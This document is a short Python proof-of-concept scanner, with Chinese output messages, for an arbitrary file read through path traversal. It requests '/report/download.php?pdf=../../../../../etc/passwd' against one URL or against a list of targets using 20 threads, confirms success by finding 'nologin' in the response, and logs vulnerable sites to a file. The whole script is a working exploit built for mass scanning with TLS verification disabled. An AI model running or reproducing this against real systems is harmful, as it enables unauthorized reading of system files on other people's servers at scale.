import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

headers = {
    "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
    "Accept": "*/*",
    "Connection": "keep-alive",
    }   

def poc(url):
    payload = '/report/download.php?pdf=../../../../../etc/passwd'
    target = url+payload
    try:
        rsp = requests.get(url=target,verify=False,timeout=5)
        if rsp.status_code == 200:
            if 'nologin' in rsp.text:
                print(f"[+]{url}存在任意文件读取")
                with open('./result.txt','a',encoding="utf-8") as f:
                    f.write(url+'\n')
            else:
                print(f"[-]{url}不存在任意文件读取")
        else:
            print(f"[-]{url}不存在任意文件读取")
    except Exception as e:
        print("[-]站点有问题")

def main():
    par = argparse.ArgumentParser()
    par.add_argument('-u','--url',dest='url',type=str,help='http://www.qqqq.com')
    par.add_argument('-f','--file',dest='file',type=str,help='target.txt')
    args = par.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and  args.file:
        url_list = []
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        mp = Pool(20)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"\n\tUage:python {sys.argv[0]} -h")
        
if __name__ == '__main__':
    main()